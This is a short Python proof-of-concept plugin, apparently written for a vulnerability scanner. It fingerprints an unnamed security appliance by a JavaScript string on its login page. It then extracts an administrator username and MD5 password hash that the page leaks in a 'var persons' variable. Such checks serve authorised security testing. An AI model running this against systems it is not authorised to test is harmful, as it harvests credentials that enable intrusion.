# -*- coding:utf-8 -*-
# 安全设备md5密码泄露

import re
from .. import requestUtil

def safe_md5_poc(url):
    resp = requestUtil.get(url)
    try:
        user_info = re.findall(r'var persons.*?"name":"(.*?)".*?"password":"(.*?)"', resp.text)[0]
        result = ["安全设备md5密码泄露", "用户名: %s<br>MD5密码: %s"%(user_info[0], user_info[1])]
    except Exception as e:
        result = []
    return result

def fingerprint(service):
    resp = requestUtil.get(service.url)
    if 'Get_Verify_Info(hex_md5(user_string).' in resp.text:
        return True

def poc(service):
    return safe_md5_poc(service.url)